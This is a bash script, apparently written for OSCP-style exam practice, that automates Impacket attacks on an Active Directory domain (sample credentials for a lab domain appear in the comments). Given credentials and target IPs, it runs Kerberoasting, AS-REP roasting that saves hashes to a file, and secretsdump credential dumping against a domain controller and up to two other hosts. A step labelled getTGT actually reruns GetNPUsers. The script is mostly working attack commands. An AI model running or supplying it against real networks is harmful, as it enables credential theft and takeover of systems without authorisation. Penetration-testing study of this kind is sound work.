#!/bin/bash
#run script like:
#bash impacket.sh -dc-ip 10.10.203.146 -ip1 10.10.203.147 -ip2 10.10.203.148 -credentials oscp.exam/tom_admin:vau\!XCKjNQBv2\$
#bash impacket.sh -ip1 10.10.203.147 -ip2 10.10.203.148 -credentials oscp.exam/tom_admin:vau\!XCKjNQBv2\$
#bash impacket.sh -ip1 10.10.203.147 -ip2 10.10.203.148 -credentials oscp.exam/tom_admin:Password123
#bash impacket.sh -dc-ip 10.10.203.146 -ip1 10.10.203.147 -credentials oscp.exam/tom_admin:Password123

# Parse the command-line arguments
while [[ $# -gt 0 ]]; do
    case "$1" in
        -dc-ip)
            dc_ip="$2"
            shift 2
            ;;
        -ip1)
            first_ip="$2"
            shift 2
            ;;
        -ip2)
            second_ip="$2"
            shift 2
            ;;
        -credentials)
            credentials="$2"
            shift 2
            ;;
        *)
            echo "Invalid argument: $1"
            echo "Usage: bash $0 [-dc-ip <DC_IP>] [-ip1 <First_IP>] [-ip2 <Second_IP>] -credentials <Domain/UserName:Password>"
            exit 1
            ;;
    esac
done

# Ensure at least one of the IP options is provided
if [[ -z "$dc_ip" && -z "$first_ip" && -z "$second_ip" ]]; then
    echo "Error: At least one of -dc-ip, -ip1, or -ip2 must be provided."
    echo "Usage: bash $0 [-dc-ip <DC_IP>] [-ip1 <First_IP>] [-ip2 <Second_IP>] -credentials <Domain/UserName:Password>"
    exit 1
fi

# Check if credentials are provided
if [[ -z "$credentials" ]]; then
    echo "Error: Missing required parameter -credentials."
    echo "Usage: bash $0 [-dc-ip <DC_IP>] [-ip1 <First_IP>] [-ip2 <Second_IP>] -credentials <Domain/UserName:Password>"
    exit 1
fi

# Set default values for optional parameters if not provided
first_ip=${first_ip:-"Not provided"}
second_ip=${second_ip:-"Not provided"}

# Output the inputs for confirmation
cat <<EOM

You have entered the following details:
- Domain Controller IP: ${dc_ip:-"Not provided"}
- First IP: $first_ip
- Second IP: $second_ip
- Credentials: $credentials

Ensure the information is correct before proceeding.
EOM

# Check if inputs are not empty and provide placeholders for user-defined actions
if [[ -n "$dc_ip" ]]; then
    echo "Domain Controller IP is not empty."
    # -- I will add my own code here:

    echo " "
    echo "1. Impacket-GetUserSPNs "
    echo "impacket-GetUserSPNs $credentials -dc-ip $dc_ip -request"
    impacket-GetUserSPNs $credentials -dc-ip $dc_ip -request
    echo " "
    echo "========================================================"

    echo " "
    echo "2. Impacket-GetNPUsers "
    echo "impacket-GetNPUsers $credentials -dc-ip $dc_ip -request -outputfile hashes.asreproast"
    impacket-GetNPUsers $credentials -dc-ip $dc_ip -request -outputfile hashes.asreproast
    echo " "
    echo "========================================================"

    echo " "
    echo "3. Impacket-getTGT "
    echo "impacket-getTGT $credentials -dc-ip $dc_ip -request"
    impacket-GetNPUsers $credentials -dc-ip $dc_ip -request
    echo " "
    echo "========================================================"

    echo " "
    echo "4. impacket-secretsdump "
    echo "impacket-secretsdump '$credentials'@'$dc_ip'"
    impacket-secretsdump $credentials@$dc_ip
    echo " "
    echo "========================================================"



fi

if [[ "$first_ip" != "Not provided" ]]; then
    echo "First IP is provided: $first_ip."
    # -- I will add my own code here:

    echo " "
    echo "1. impacket-secretsdump "
    echo "impacket-secretsdump '$credentials'@'$first_ip'"
    impacket-secretsdump $credentials@$first_ip
    echo " "
    echo "========================================================"

fi

if [[ "$second_ip" != "Not provided" ]]; then
    echo "Second IP is provided: $second_ip."
    # -- I will add my own code here:

    echo " "
    echo "1. impacket-secretsdump "
    echo "impacket-secretsdump '$credentials'@'$second_ip'"
    impacket-secretsdump $credentials@$second_ip
    echo " "
    echo "========================================================"

fi

# Output the inputs for confirmation
cat <<EOM

You have entered the following details:
- Domain Controller IP: $dc_ip
- First IP: $first_ip
- Second IP: $second_ip
- Credentials: $credentials

Ensure the information is correct before proceeding.
EOM
